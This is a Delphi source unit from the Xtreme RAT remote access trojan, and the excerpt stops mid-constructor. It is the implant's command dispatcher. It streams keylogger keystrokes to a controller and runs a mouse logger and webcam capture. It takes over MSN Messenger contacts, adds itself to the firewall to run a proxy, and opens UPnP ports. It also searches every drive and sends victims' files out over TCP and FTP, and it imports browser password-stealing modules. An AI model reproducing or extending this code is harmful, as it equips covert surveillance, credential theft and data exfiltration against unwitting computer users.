Unit UnitExecutarComandos;
{$I Compilar.inc}

interface

uses
  Windows,
  UnitObjeto;

var
  WM_GETMSNSTATUS, WM_SETMSNSTATUS, WM_EXITMSN, WM_MSNCONTACTLIST,
  WM_MSNADDCONTACT, WM_MSNDELCONTACT, WM_MSNBLOCKCONTACT, WM_MSNUNBLOCKCONTACT,
  WM_PROXYSTART, WM_PROXYSTOP,
  WM_MOUSELOGGERSTART, WM_MOUSELOGGERSTOP,
  WM_MOUSESTART, WM_MOUSESTOP,
  WM_MAININFO, WM_WEBCAMLIST, WM_WEBCAMDIRECTX,
  WM_LASTPING, WM_WEBCAMSTART: cardinal;

procedure ExecutarComando(ComandoRecebido: WideString); stdcall;
function ServerWindowProc(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;

implementation

uses
  ActiveX,
  ComObj,
  Messages,
  SysUtils,
  Classes,
  StrUtils,
  UnitGetAccType,
  GlobalVars,
  UnitConfigs,
  UnitConstantes,
  UnitConexao,
  UnitRegEdit,
  UnitFuncoesDiversas,
  InformacoesServidor,
  GetSecurityCenterInfo,
  UnitBandeiras,
  UnitStartWebcam,
  WebcamAPI,
  UnitInformacoes,
  ListarDispositivos,
  MSNfunc,
  NewProxyServer,
  UnitMouseLogger,
  UntCapFuncs,
  UnitUpload,
  UnitProcess,
  PerfUtils,
  UnitWindows,
  UnitServices,
  UnitNewConnection,
  UnitFileManager,
  UnitKeylogger,
  UnitClipboard,
  UnitListarPortasAtivas,
  UnitInstalledApplications,
  UnitServerOpcoesExtras,
  UnitChat,
  uCamHelper,
  UnitCryptString,

  UnitFireFox3_5,
  UnitPasswords,
  OperaPasswords,
  Miranda,
  PasswordRecovery,
  SafariPasswordRecovery,
  sndkey32,

  UnitUnZip;

type
  TShiftState = set of (ssShift, ssAlt, ssCtrl,
    ssLeft, ssRight, ssMiddle, ssDouble);

type
  TKeys = record
    key: integer;
    shift: TShiftState;
end;

const
  NumeroDeVariaveis = 20;
type
  TSplit = array [0..NumeroDeVariaveis] of widestring;

var
  XtremeRATProxy: WideString = 'XtremeRATProxy';
  kHook_Stopmouse : cardinal = 0;
  MSGRAPIController: TMSGRAPIController;
  kHook_mouse: cardinal = 0;

Procedure PostKeyEx32( key: Word; Const shift: TShiftState; specialkey: Boolean );
Type
  TShiftKeyInfo = Record
                    shift: Byte;
                    vkey : Byte;
                  End;
  byteset = Set of 0..7;
Const
  shiftkeys: Array [1..3] of TShiftKeyInfo =
    ((shift: Ord(ssCtrl); vkey: VK_CONTROL ),
     (shift: Ord(ssShift); vkey: VK_SHIFT ),
     (shift: Ord(ssAlt); vkey: VK_MENU ));
Var
  flag: DWORD;
  bShift: ByteSet absolute shift;
  i: Integer;
Begin
  For i := 1 To 3 Do
  Begin
    If shiftkeys[i].shift In bShift Then
      keybd_event( shiftkeys[i].vkey,
                   MapVirtualKey(shiftkeys[i].vkey, 0),
                   0, 0);
  End; { For }
  If specialkey Then flag := KEYEVENTF_EXTENDEDKEY Else flag := 0;

  keybd_event( key, MapvirtualKey( key, 0 ), flag, 0 );
  flag := flag or KEYEVENTF_KEYUP;
  keybd_event( key, MapvirtualKey( key, 0 ), flag, 0 );

  For i := 3 DownTo 1 Do
  Begin
    If shiftkeys[i].shift In bShift Then
    keybd_event( shiftkeys[i].vkey,
                   MapVirtualKey(shiftkeys[i].vkey, 0),
                   KEYEVENTF_KEYUP, 0);
  End; { For }
End; { PostKeyEx32 }

function LowLevelKeybdHookProc_Stopmouse(nCode, wParam, lParam : integer) : integer; stdcall;
begin
  result := 1;
  if ncode <> 0 then
  Result := CallNextHookEx(kHook_Stopmouse, nCode, wParam, lParam);
end;

function GetFirstExecution: widestring;
var
  tempstr: widestring;
begin
  result := lerreg(HKEY_CURRENT_USER, widestring('SOFTWARE\' + ConfiguracoesServidor.Mutex), widestring('FirstExecution'), '');
  if result = '' then
  begin
    tempstr := ShowTime;
    Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'FirstExecution', tempstr);
    Result := tempstr;
  end;
end;

function GetNewIdentificationName(NewName: WideString): WideString;
begin
  if NewName <> '' then
  begin
    if Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'NewId', NewName) = true then
      result := NewName
    else
      result := ConfiguracoesServidor.ServerID;
    exit;
  end else
  begin
    result := lerreg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'NewId', '');
    if result = '' then result := ConfiguracoesServidor.ServerID;
  end;
  
  Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'NewId', Result);
end;

function GetNewGroupName(NewName: WideString): WideString;
begin
  if NewName <> '' then
  begin
    if Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'NewGroup', NewName) = true then
      result := NewName
    else
      result := ConfiguracoesServidor.GroupID;
    exit;
  end else
  begin
    result := lerreg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'NewGroup', '');
    if result = '' then result := ConfiguracoesServidor.GroupID;
  end;

  Write2Reg(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex, 'NewGroup', Result);
end;

function IntToStr(i: Int64): WideString;
begin
  Str(i, Result);
end;

function StrToInt(S: WideString): Int64;
var
  E: integer;
begin
  Val(S, Result, E);
end;

function PossoMexer(fName: widestring): boolean;
var
  HFileRes : HFILE;
begin
  HFileRes := CreateFileW(pwchar(fName), GENERIC_READ or GENERIC_WRITE, 0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0) ;
  Result := (HFileRes = INVALID_HANDLE_VALUE);
  if not Result then CloseHandle(HFileRes);
  Result := not Result;
end;

function PossoCriar(FileName: widestring): boolean;
var
  FS: TFileStream;
begin
  result := true;
  try
    FS := TFileStream.Create(Filename, fmCreate);
    except
    result := false;
  end;
  FreeAndNil(FS);
  if Result = True then DeleteFileW(pWideChar(FileName));
end;

function SplitString(Str, Delimitador: widestring): TSplit;
var
  i: integer;
  TempStr: widestring;
begin
  i := 0;
  TempStr := Str;
  if posex(Delimitador, TempStr) <= 0 then exit;

  while (TempStr <> '') and (i <= NumeroDeVariaveis) do
  begin
    Result[i] := Copy(TempStr, 1, posex(Delimitador, TempStr) - 1);
    delete(TempStr, 1, posex(Delimitador, TempStr) - 1);
    delete(TempStr, 1, length(delimitadorComandos));
    inc(i);
  end;
end;

procedure StrToAnyArray(Str: WideString; MaxSize: integer; var MyArray: array of WideChar);
var
  Size: integer;
begin
  if Str = '' then Exit;
  if MaxSize <= 0 then Exit;

  Size := Length(Str) * 2;
  if Size > MaxSize then CopyMemory(@MyArray, @Str[1], MaxSize) else
  CopyMemory(@MyArray, @Str[1], Size);
end;

function AddUPnPEntry(LAN_IP: string; Port: Integer; const Name: ShortString): boolean;
Var
  Nat: Variant;
  Ports: Variant;
Begin
  result := false;
  if not (LAN_IP = '127.0.0.1') then
  begin
    CoInitialize(nil);
    try
      Nat := CreateOleObject('HNetCfg.NATUPnP');
      Ports := Nat.StaticPortMappingCollection;
      Ports.Add(port, 'TCP', port, LAN_IP, True, name);
      except
      CoUnInitialize;
      exit;
    end;
    CoUnInitialize;
    result := True;
  end;
end;

function DeleteUPnPEntry(Port: Integer): boolean;
Var
  Nat: Variant;
  Ports: Variant;
Begin
  result := false;
  CoInitialize(nil);
  try
    Nat := CreateOleObject('HNetCfg.NATUPnP');
    Ports := Nat.StaticPortMappingCollection;
    Ports.Remove(port, 'TCP');
    except
    CoUnInitialize;
    exit;
  end;
  CoUnInitialize;
  result := True;
end;

function ServerWindowProc(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
type
  xString = array [0..MAX_PATH] of WideChar;
var
  TempInt: integer;
  TempStr, ToSend: WideString;
  s, i: integer;
  BMP: TBitmap;
  Resultado: xString;
begin
  if Msg = WM_ONLINEKEY then
  begin
    if MainIdTCPClient = nil then Exit;
    if MainIdTCPClient.Connected = false then Exit;
    s := integer(wParam);
    CopyMemory(@Resultado, pointer(lparam), S);
    VirtualFree(pointer(lparam), 0, MEM_RELEASE);
    TempStr := WideString(Resultado);
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERONLINEKEY + '|' + TempStr);
  end else

  if Msg = WM_ACTIVEKEY then
  begin
    StopKey;
    StartKey;
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERATIVAR + '|' + 'T' + '|');
  end else

  if Msg = WM_DEACTIVEKEY then
  begin
    StopKey;
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + KEYLOGGERATIVAR + '|' + 'F' + '|');
  end else

  if Msg = WM_LASTPING then
  begin
    LastPing := GetTickCount;
  end else

  if Msg = WM_GETMSNSTATUS then
  begin
    if Assigned(MSGRAPIController) = True then MSGRAPIController.Free;
    MSGRAPIController := TMSGRAPIController.Create;
    if MSGRAPIController.Messenger <> nil then
    begin
      TempInt := MSGRAPIController.Status;
      if TempInt = MSGR_ONLINE then TempInt := 0 else
      if (TempInt = MSGR_AWAY) or
         (TempInt = MSGR_BE_RIGHT_BACK) or
         (TempInt = MSGR_ON_THE_PHONE) or
         (TempInt = MSGR_OUT_TO_LUNCH) then TempInt := 1 else
      if TempInt = MSGR_BUSY then TempInt := 2 else
      if TempInt = MSGR_INVISIBLE then TempInt := 3 else
      TempInt := 4;
      GlobalVars.MainIdTCPClient.EnviarString(MSN + '|' + GETMSNSTATUS + '|' + IntToStr(TempInt));
      if TempInt <> 4 then
      begin
        TempStr := '';
        TempStr := TempStr + MSGRAPIController.FriendlyName + DelimitadorComandos;
        TempStr := TempStr + MSGRAPIController.SignInName + DelimitadorComandos;
        TempStr := TempStr + MSGRAPIController.Servicename + DelimitadorComandos;
        TempStr := TempStr + MSGRAPIController.UnreadEmail + DelimitadorComandos;
        TempStr := TempStr + MSGRAPIController.ReceiveFileDirectory + DelimitadorComandos;
        GlobalVars.MainIdTCPClient.EnviarString(MSN + '|' + MSNINFO + '|' + TempStr);
      end;
    end else
    begin
      TempInt := 5;
      GlobalVars.MainIdTCPClient.EnviarString(MSN + '|' + GETMSNSTATUS + '|' + IntToStr(TempInt));
    end;
  end else

  if Msg = WM_SETMSNSTATUS then
  begin
    if Assigned(MSGRAPIController) = False then Exit;
    TempInt := integer(wParam);

    if TempInt = 0 then MSGRAPIController.SetStatus(MSGR_ONLINE) else
    if TempInt = 1 then MSGRAPIController.SetStatus(MSGR_AWAY) else
    if TempInt = 2 then MSGRAPIController.SetStatus(MSGR_BUSY) else
    if TempInt = 3 then MSGRAPIController.SetStatus(MSGR_INVISIBLE) else
    if TempInt = 4 then MSGRAPIController.SignOut;

    if TempInt = 4 then
    begin
      GlobalVars.MainIdTCPClient.EnviarString(MSN + '|' + GETMSNSTATUS + '|' + IntToStr(TempInt));
      MSGRAPIController.Free;
      MSGRAPIController := nil;
    end else
    GlobalVars.MainIdTCPClient.EnviarString(MSN + '|' + GETMSNSTATUS + '|' + IntToStr(TempInt));
  end else

  if Msg = WM_EXITMSN then
  begin
    if Assigned(MSGRAPIController) = True then
    begin
      MSGRAPIController.Free;
      MSGRAPIController := nil;
    end;

  end else

  if Msg = WM_MSNCONTACTLIST then
  begin
    TempStr := MSGRAPIController.ListContacts(DelimitadorComandos);
    GlobalVars.MainIdTCPClient.EnviarString(MSN + '|' + MSNCONTACTLIST + '|' + TempStr);
  end else

  if Msg = WM_MSNADDCONTACT then
  begin
    s := integer(wParam);
    SetLength(TempStr, s div 2);
    copymemory(@TempStr[1], pointer(lparam), s);
    MSGRAPIController.AddContact(TempStr);
    GlobalVars.MainIdTCPClient.EnviarString(MSN + '|' + MSNADDCONTACT + '|' + TempStr);
  end else

  if Msg = WM_MSNDELCONTACT then
  begin
    s := integer(wParam);
    SetLength(TempStr, s div 2);
    copymemory(@TempStr[1], pointer(lparam), s);
    MSGRAPIController.RemoveContact(TempStr);
    GlobalVars.MainIdTCPClient.EnviarString(MSN + '|' + MSNDELCONTACT + '|' + TempStr);
  end else

  if Msg = WM_MSNBLOCKCONTACT then
  begin
    s := integer(wParam);
    SetLength(TempStr, s div 2);
    copymemory(@TempStr[1], pointer(lparam), s);
    MSGRAPIController.BlockContact(TempStr);
    GlobalVars.MainIdTCPClient.EnviarString(MSN + '|' + MSNBLOCKCONTACT + '|' + TempStr);
  end else

  if Msg = WM_MSNUNBLOCKCONTACT then
  begin
    s := integer(wParam);
    SetLength(TempStr, s div 2);
    copymemory(@TempStr[1], pointer(lparam), s);
    MSGRAPIController.UnBlockContact(TempStr);
    GlobalVars.MainIdTCPClient.EnviarString(MSN + '|' + MSNUNBLOCKCONTACT + '|' + TempStr);
  end else

  // início do proxy
  if Msg = WM_PROXYSTART then
  begin
    StopProxy;
    i := integer(wparam);
    AddApplicationToFirewall(XtremeRATProxy, ParamStr(0));
    if StartHttpProxy(i) = false then
    begin
      GlobalVars.MainIdTCPClient.EnviarString(PROXYSTOP + '|' + IntToStr(ProxyPort));
    end else
    begin
      GlobalVars.MainIdTCPClient.EnviarString(PROXYSTART + '|' + IntToStr(ProxyPort));
    end;
  end else

  if Msg = WM_PROXYSTOP then
  begin
    if (MainIdTCPClient.IOHandler.Connected) and (ProxyPort > 0) then
    GlobalVars.MainIdTCPClient.EnviarString(PROXYSTOP + '|' + IntToStr(ProxyPort));
    DeleteUPnPEntry(ProxyPort);
    StopProxy;
  end else
  // fim do proxy

  // início das funções do mouse
  if Msg = WM_MOUSESTOP then
  begin
    if kHook_Stopmouse <> 0 then UnhookWindowsHookEx(kHook_Stopmouse);
    kHook_Stopmouse := SetWindowsHookEx(14, @LowLevelKeybdHookProc_Stopmouse, GetModuleHandle(0), 0);
  end else

  if Msg = WM_MOUSESTART then
  begin
    if kHook_Stopmouse <> 0 then UnhookWindowsHookEx(kHook_Stopmouse);
    kHook_Stopmouse := 0;
  end else
  // fim das funções do mouse

  if Msg = WM_MOUSELOGGERSTART then
  begin
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + MOUSELOGGERSTART + '|' + MouseFolder + '|' + RelacaoJanelas);
    IniciarMouseLogger;
  end else

  if Msg = WM_MOUSELOGGERSTOP then
  begin
    GlobalVars.MainIdTCPClient.EnviarString(KEYLOGGER + '|' + MOUSELOGGERSTOP + '|');
    StopMouseLogger;
  end else

  if Msg = WM_MAININFO then
  begin
    s := integer(wParam);
    SetLength(ToSend, s div 2);
    copymemory(@ToSend[1], pointer(lparam), s);

    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if Msg = WM_WEBCAMDIRECTX then
  begin
    CamHelper.GetCams;
    if CamHelper.CamCount > 0 then Result := 1 else Result := 0;
    exit;
  end else

  if Msg = WM_WEBCAMLIST then
  begin
    TempStr := WideString(CamHelper.GetCams);
    if CamHelper.CamCount <= 0 then TempStr := ListarDispositivosWebCam('|');

    GlobalVars.MainIdTCPClient.EnviarString(WEBCAMLIST + '|' + TempStr);
  end else

  if Msg = WM_WEBCAMSTART then
  begin
    if WebcamType = 0 then CamHelper.StartCam(SelectedWebcam + 1);

    NewConnection(MainIdTCPClient.Host,
                  MainIdTCPClient.Port,
                  unitconstantes.NEWCONNECTION + '|' +
                  ConnectionID +
                  DelimitadorComandos +
                  WEBCAM + '|' +
                  WEBCAMSTART + '|',
                  False);
  end else

  Result := DefWindowProc(HWND, Msg, wParam, lParam);
end;

type
  TNewUpload = class(TThread)
  private
    Host: ansistring;
    Port: integer;
    FileName: WideString;
    FileSize: int64;
    Command: WideString;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring; xPort: integer; xFileName: WideString; xFileSize: int64; xCommand: WideString);
  end;

constructor TNewUpload.Create(xHost: ansistring; xPort: integer; xFileName: WideString; xFileSize: int64; xCommand: WideString);
begin
  Host := xHost;
  Port := xPort;
  FileName := xFileName;
  FileSize := xFileSize;
  Command := xCommand;
  inherited Create(True);
end;

procedure TNewUpload.Execute;
begin
  NewUpload(Host,
            Port,
            FileName,
            FileSize,
            Command);
end;

type
  TCpuUsage = class(TThread)
  private
    Host: ansistring;
    Port: integer;
    MyProcess: cardinal;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring;
                       xPort: integer;
                       xProcess: cardinal);
  end;

constructor TCpuUsage.Create(xHost: ansistring;
                             xPort: integer;
                             xProcess: Cardinal);
begin
  Host := xHost;
  Port := xPort;
  MyProcess := xProcess;
  inherited Create(True);
end;
 function GetCpuUsages(PID: cardinal): Double;
var
  Data1, Data2: PPerfDataBlock;
  ProcessorCount: Integer;
  PercentProcessorTime: Double;
begin
try
  ProcessorCount := GetProcessorCount;
  Data1 := GetPerformanceData(IntToStr(ObjProcess));
  Sleep(250);
  Data2 := GetPerformanceData(IntToStr(ObjProcess));
  Result := GetProcessPercentProcessorTime(PID, Data1, Data2, ProcessorCount);
finally
  freemem(data1);
  freemem(data2);
  releasedc(pid, ProcessorCount);
end;
end;
procedure TCpuUsage.Execute;
var
  Command: widestring;
begin
  Command := PROCESS + '|' +
             CPUUSAGE + '|' +
             IntToStr(MyProcess) + '|' +
             FormatFloat('##,##0.00', GetCpuUsages(MyProcess)) + '|';
  GlobalVars.MainIdTCPClient.EnviarString(Command);
end;

type
  TCrazyWin = class(TThread)
  private
    frm: integer;
  protected
    procedure Execute; override;
  public
    constructor Create(xHandle: integer);
  end;

constructor TCrazyWin.Create(xHandle: integer);
begin
  frm := xHandle;
  inherited Create(True);
end;

function RandomRange(const AFrom, ATo: Integer): Integer;
begin
  if AFrom > ATo then
    Result := Random(AFrom - ATo) + ATo
  else
    Result := Random(ATo - AFrom) + AFrom;
end;

procedure TCrazyWin.Execute;
var
  r: TRect;
  i, n1, n2: integer;
begin
  GetWindowRect(frm, r);
  for i := 0 to 200 do
  begin
    n1 := RandomRange(-10, 10);
    n2 := RandomRange(-10, 10);
    SetWindowpos(frm, 0 , r.Left + n1, r.Top + n2, r.Right - r.Left, r.Bottom - r.Top, 0);
    sleep(20);
    ProcessMessages;
  end;
  SetWindowpos(frm, 0, r.Left, r.Top, r.Right - r.Left, r.Bottom - r.Top, 0);
end;

type
  TNewConnectionThread = class(TThread)
  private
    Host: ansistring;
    Port: integer;
    Command: WideString;
    Extras: WideString;
    FinalizarConexao: boolean;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring;
                       xPort: integer;
                       xCommand: widestring;
                       xFinalizarConexao: boolean;
                       xExtras: WideString = '');
  end;

constructor TNewConnectionThread.Create(xHost: ansistring;
                                        xPort: integer;
                                        xCommand: widestring;
                                        xFinalizarConexao: boolean;
                                        xExtras: WideString = '');
begin
  Host := xHost;
  Port := xPort;
  Command := xCommand;
  Extras := xExtras;
  FinalizarConexao := xFinalizarConexao;
  inherited Create(True);
end;

procedure TNewConnectionThread.Execute;
begin
  NewConnection(Host,
                Port,
                Command,
                FinalizarConexao,
                Extras);
end;

type
  TComputersLAN = class(TThread)
  private
    Host: ansistring;
    Port: integer;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring;
                       xPort: integer);
  end;

constructor TComputersLAN.Create(xHost: ansistring;
                                xPort: integer);
begin
  Host := xHost;
  Port := xPort;
  inherited Create(True);
end;

procedure TComputersLAN.Execute;
var
  Command: Widestring;
begin
  Command := unitconstantes.NEWCONNECTION + '|' +
             ConnectionID +
             DelimitadorComandos +
             FILEMANAGERNEW + '|' +
             FMSHAREDDRIVELIST + '|' + ListSharedFolders;
  NewConnection(Host,
                Port,
                Command,
                True);
end;

type
  TNewDownload = class(TThread)
  private
    Host: ansistring;
    Port: integer;
    FileName: wideString;
    IsDownloadFolder: boolean;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring; xPort: integer; xFileName: widestring; xIsDownloadFolder: boolean = False);
  end;

constructor TNewDownload.Create(xHost: ansistring; xPort: integer; xFileName: widestring; xIsDownloadFolder: boolean = False);
begin
  Host := xHost;
  Port := xPort;
  FileName := xFileName;
  IsDownloadFolder := xIsDownloadFolder;
  inherited Create(True);
end;

procedure TNewDownload.Execute;
begin
  NewDownload(Host,
              Port,
              FileName,
              IsDownloadFolder);
end;

type
  TNewResumeDownload = class(TThread)
  private
    Host: ansistring;
    Port: integer;
    FileName: wideString;
    FilePosition: int64;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring; xPort: integer; xFileName: widestring; xFilePosition: int64);
  end;

constructor TNewResumeDownload.Create(xHost: ansistring; xPort: integer; xFileName: widestring; xFilePosition: int64);
begin
  Host := xHost;
  Port := xPort;
  FileName := xFileName;
  FilePosition := xFilePosition;
  inherited Create(True);
end;

procedure TNewResumeDownload.Execute;
begin
  NewResumeDownload(Host,
                    Port,
                    FileName,
                    FilePosition);
end;

type
  TGetThumbs = class(TThread)
  private
    Host: ansistring;
    Port: integer;
    Size: integer;
    Quality: integer;
    FileList: widestring;
    IsThumbSearch: boolean;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring;
                       xPort: integer;
                       xSize: integer;
                       xQuality: integer;
                       xFileList: widestring;
                       xIsThumbSearch: boolean);
  end;

constructor TGetThumbs.Create(xHost: ansistring;
                              xPort: integer;
                              xSize: integer;
                              xQuality: integer;
                              xFileList: widestring;
                              xIsThumbSearch: boolean);
begin
  Host := xHost;
  Port := xPort;
  Size := xSize;
  Quality := xQuality;
  FileList := xFileList;
  IsThumbSearch := xIsThumbSearch;
  inherited Create(True);
end;

procedure TGetThumbs.Execute;
var
  Result: widestring;
  Command: widestring;
begin
  if IsThumbSearch then ThumbSearchStop := true else ThumbStop := True;
  sleep(100);
  if IsThumbSearch then ThumbSearchStop := false else ThumbStop := false;

  if IsThumbSearch then
  begin
    Result := GetSearchThumbs(Size, Quality, FileList);
    Command := FMTHUMBS_SEARCH;
  end else
  begin
    Result := GetThumbs(Size, Quality, FileList);
    Command := FMTHUMBS;
  end;

  if Result <> '' then
  begin
    Command := unitconstantes.NEWCONNECTION + '|' +
               ConnectionID +
               DelimitadorComandos +
               FILEMANAGERNEW + '|' +
               Command + '|' + inttostr(size) + '|' + Result;
    NewConnection(Host,
                  Port,
                  Command,
                  True);
  end;
end;

type
  TSearchFiles = class(TThread)
  private
    Host: ansistring;
    Port: integer;
    PathName: widestring;
    FileName: widestring;
    InDir: boolean;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring;
                       xPort: integer;
                       xPathName: widestring;
                       xFileName: widestring;
                       xInDir: boolean);
  end;

constructor TSearchFiles.Create(xHost: ansistring;
                                xPort: integer;
                                xPathName: widestring;
                                xFileName: widestring;
                                xInDir: boolean);
begin
  Host := xHost;
  Port := xPort;
  PathName := xPathName;
  FileName := xFileName;
  InDir := xInDir;
  inherited Create(True);
end;

procedure TSearchFiles.Execute;
var
  Command: widestring;
begin
  SearchFileStop := true;
  sleep(100);

  SearchFileStop := false;
  SearchFileResult := '';
  FileSearch(PathName, FileName, InDir);
  SearchFileStop := true;

  Command := unitconstantes.NEWCONNECTION + '|' +
             ConnectionID +
             DelimitadorComandos +
             FILEMANAGERNEW + '|' +
             FMFILESEARCHLIST + '|' + SearchFileResult;
  NewConnection(Host,
                Port,
                Command,
                True);
  SearchFileResult := '';
end;

type
  TNewFTPThread = class(TThread)
  private
    FTPAddress: WideString;
    FTPDir: WideString;
    FTPUser: WideString;
    FTPPass: WideString;
    FTPRemoteName: WideString;
    FTPLocalName: WideString;
  protected
    procedure Execute; override;
  public
    constructor Create(xFTPAddress: WideString;
                       xFTPDir: WideString;
                       xFTPUser: WideString;
                       xFTPPass: WideString;
                       xFTPRemoteName: WideString;
                       xFTPLocalName: WideString);
  end;

constructor TNewFTPThread.Create(xFTPAddress: WideString;
                                 xFTPDir: WideString;
                                 xFTPUser: WideString;
                                 xFTPPass: WideString;
                                 xFTPRemoteName: WideString;
                                 xFTPLocalName: WideString);
begin
  FTPAddress := xFTPAddress;
  FTPDir := xFTPDir;
  FTPUser := xFTPUser;
  FTPPass := xFTPPass;
  FTPRemoteName := xFTPRemoteName;
  FTPLocalName := xFTPLocalName;
  inherited Create(True);
end;

procedure TNewFTPThread.Execute;
begin
  if FTPUploadFile(pWideChar(FTPAddress),
                   pWideChar(FTPDir),
                   pWideChar(FTPLocalName),
                   pWideChar(FTPRemoteName),
                   pWideChar(FTPUser),
                   pWideChar(FTPPass)) then GlobalVars.MainIdTCPClient.EnviarString(
                                                       FILEMANAGER + '|' +
                                                       FMSENDFTPYES + '|' + FTPLocalName) else
                   GlobalVars.MainIdTCPClient.EnviarString(
                                FILEMANAGER + '|' +
                                FMSENDFTPNO + '|' + FTPLocalName);
end;

type
  TFileExistsComputer = class(TThread)
  private
    Host: ansistring;
    Port: integer;
    FileName: widestring;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring;
                       xPort: integer;
                       xFileName: widestring);
  end;

constructor TFileExistsComputer.Create(xHost: ansistring;
                                xPort: integer;
                                xFileName: widestring);
begin
  Host := xHost;
  Port := xPort;
  FileName := xFileName;
  inherited Create(True);
end;

function GetLogicalDriveStrings(nBufferLength: DWORD;
  lpBuffer: PWideChar): DWORD; stdcall; external 'kernel32.dll' name 'GetLogicalDriveStringsW';

procedure TFileExistsComputer.Execute;
var
  BufferSize: dword;
  PBuffer, Buffer: PWideChar;
  Drives: WideString;
  TempStr: WideString;
begin
  Drives := '';
  TempStr := '';
  BufferSize := 10000;
  GetMem(Buffer, BufferSize);
  GetLogicalDriveStrings(BufferSize, Buffer);
  PBuffer := Buffer;

  while PBuffer^ <> #0 do
  begin
    Drives := Drives + WideString(PBuffer) + '|';
    Inc(PBuffer,4);
  end;

  while (posex('|', Drives) > 0) and (TempStr = '') do
  begin
    TempStr := FileExistsOnComp(Copy(Drives, 1, posex('|', Drives) - 1), FileName, True);
    delete(drives, 1, posex('|', drives));
  end;

  if TempStr <> '' then
  GlobalVars.MainIdTCPClient.EnviarString(UnitConstantes.FILESEARCH + '|' + TempStr) else
  GlobalVars.MainIdTCPClient.EnviarString(UnitConstantes.FILESEARCH + '|');
end;

type
  TDownloadAll = class(TThread)
  private
    Host: ansistring;
    Port: integer;
    Filter: widestring;
    Option: integer;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring;
                       xPort: integer;
                       xFilter: widestring;
                       xOption: integer);
  end;

constructor TDownloadAll.Create(xHost: ansistring;
                                xPort: integer;
                                xFilter: widestring;
                                xOption: integer);
begin
  Host := xHost;
  Port := xPort;
  Filter := xFilter;
  Option := xOption;
  inherited Create(True);
end;

type
  TRecDownloadAll = record
    Filter: array [0..1000] of widechar;
    Option: integer;
  end;

procedure TDownloadAll.Execute;
var
  BufferSize: dword;
  PBuffer, Buffer: PWideChar;
  Drives: WideString;
  TempStr: WideString;
  InSearch: boolean;
  RecDownloadAll: TRecDownloadAll;
  MS: TMemoryStream;
begin
  Drives := '';
  TempStr := '';
  BufferSize := 10000;
  GetMem(Buffer, BufferSize);
  GetLogicalDriveStrings(BufferSize, Buffer);
  PBuffer := Buffer;

  FillChar(RecDownloadAll, SizeOf(RecDownloadAll), #0);
  CopyMemory(@RecDownloadAll.Filter[0], @Filter[1], Length(Filter) * 2);
  RecDownloadAll.Option := Option;

  while PBuffer^ <> #0 do
  begin
    Drives := Drives + WideString(PBuffer) + '|';
    Inc(PBuffer,4);
  end;

  while posex('|', Drives) > 0 do
  begin
    if Option = 0 then InSearch := False else InSearch := True;
    TempStr := TempStr + DownloadAllFiles(Copy(Drives, 1, posex('|', Drives) - 1), Filter, True, InSearch);
    delete(drives, 1, posex('|', drives));
  end;

  if TempStr = '' then
  begin
    GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDOWNLOADALL + '|' + TempStr);
    Exit;
  end;

  MS := TMemoryStream.Create;
  MS.Write(RecDownloadAll, SizeOf(RecDownloadAll));
  MS.Write(TempStr[1], Length(TempStr) * 2);
  MS.Position := 0;
  TempStr := '';
  SetLength(TempStr, MS.Size div 2);
  MS.Read(TempStr[1], MS.Size);
  MS.Free;

  GlobalVars.MainIdTCPClient.EnviarString(FILEMANAGER + '|' + FMDOWNLOADALL + '|' + TempStr);
end;

type
  TMessageBox = class(TThread)
  private
    Host: ansistring;
    Port: integer;
    TempStr, TempStr1: Widestring;
    TempInt, TempInt1: integer;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: Widestring;
                       xPort: integer;
                       xTempStr, xTempStr1: Widestring;
                       xTempInt, xTempInt1: integer);
  end;

constructor TMessageBox.Create(xHost: Widestring;
                              xPort: integer;
                              xTempStr, xTempStr1: Widestring;
                              xTempInt, xTempInt1: integer);
begin
  Host := xHost;
  Port := xPort;
  TempStr := xTempStr;
  TempStr1 := xTempStr1;
  TempInt := xTempint;
  TempInt1 := xTempInt1;
  inherited Create(True);
end;

procedure TMessageBox.Execute;
var
  Command: Widestring;
  TempInt2: integer;
begin
  TempInt2 := messageboxw(0, pwidechar(TempStr1), pwidechar(TempStr), MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST or TempInt or TempInt1);

  Command := unitconstantes.NEWCONNECTION + '|' +
             ConnectionID +
             DelimitadorComandos +
             NEWFDIVERSOS + '|' +
             FMESSAGE + '|' +
             inttostr(TempInt2) + '|';
  NewConnection(Host,
                Port,
                Command,
                False);
end;

type
  TNewEnviarMouse = class(TThread)
  private
    Host: ansistring;
    Port: integer;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring; xPort: integer);
  end;

constructor TNewEnviarMouse.Create(xHost: ansistring; xPort: integer);
begin
